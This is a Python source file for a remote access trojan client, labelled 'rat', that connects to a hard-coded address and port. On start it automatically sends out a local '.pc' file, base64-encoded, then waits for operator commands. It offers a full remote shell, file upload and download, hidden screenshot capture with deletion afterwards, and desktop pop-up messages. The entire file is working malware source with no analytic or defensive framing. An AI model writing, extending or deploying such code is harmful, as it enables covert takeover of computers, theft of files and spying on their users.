#!/usr/bin/env python3

import socket
import subprocess
import os
import base64
import json
import time
import pyautogui

class CLIENT:

    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.curdir = os.getcwd()

    def connection(self):
        global sock
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((self.host, self.port))
        information_send = socket.gethostbyname(socket.gethostname())
        sock.send(information_send.encode())

    def CompromisedExfil(self):
        filename = ''
        fileList = os.listdir(".")
        for file in fileList:
            if file.endswith(".pc"):
                print ("File: " + file)   
                filename = str(file)             


        file = open(filename, "rb")
        bytes = file.read(1024)
        base64_bytes = base64.b64encode(bytes)
        file_json = {
            "name" : filename,
            "data" : base64_bytes.decode()
        }
        file_send = json.dumps(file_json)
        sock.send(file_send.encode())

    # def installdep(self):
    #     subprocess.run(['pip', 'install', 'pyautogui'])
    
    def upload(self):
        json_data = sock.recv(1024).decode()
        convert_json = json.loads(json_data)
        name = convert_json['name']
        bytes = convert_json['data']
        b64decoded_bytes = base64.b64decode(bytes)
        file_name = name.split('.')
        file = open(f"{file_name[0]}" + '.' + f"{file_name[1]}", 'wb')
        file.write(b64decoded_bytes)
        file.close()
        
    def screenshot(self):
        file = 'screenshot.png'
        pyautogui.screenshot(file)
        time.sleep(5)
        file = open(file, 'rb')
        file_data = file.read()
        data_len = len(file_data)
        str_data_len = str(data_len)
        sock.send(str_data_len.encode())
        time.sleep(1)
        sock.send(file_data)
        file.close()
        time.sleep(.2)
        subprocess.run(['rm', 'screenshot.png'])
        
    def cd(self, command):
        os.chdir(command[3:])
        directory = os.getcwd()
        str_dir = str(directory)
        sock.send(str_dir.encode())
        command = ''
    
    def download(self, command):
        filename = command[9:]
        file = open(filename, "rb")
        bytes = file.read(600000)
        base64_bytes = base64.b64encode(bytes)
        file_json = {
                "name": file.name,
                "data": base64_bytes.decode()
                    }
        file_send = json.dumps(file_json)
        sock.send(file_send.encode())
        command = ''
     
    def sendmessage(self):
        message = sock.recv(1024).decode()
        print(message)
        subprocess.run(["/usr/bin/notify-send", "--icon=error", message])
 
    def main_loop(self):
        while True:
            
            command = sock.recv(1024).decode()

            if command == 'shell':
                while True:
                    command = sock.recv(1024).decode()
                    try:
                        if command == "exit":
                            break
                        elif command[:2] == 'cd':
                            self.cd(command)
                        elif command[:3] == 'cat':
                            continue
                        elif command[:8] == 'download':
                            self.download(command)
                            continue
                        output = subprocess.getoutput(command)
                        sock.send(output.encode())
                    except:
                        err = 'bad command'
                        sock.send(err.encode())

            if command == "upload":
                self.upload()

            elif command == "screenshot":
                self.screenshot()
                continue
            elif command == "sendmessage":
                self.sendmessage()
                continue

                
rat = CLIENT('192.168.56.113', 3312)

if __name__ == '__main__':
    # rat.installdep()
    rat.connection()
    rat.CompromisedExfil()
    rat.main_loop()
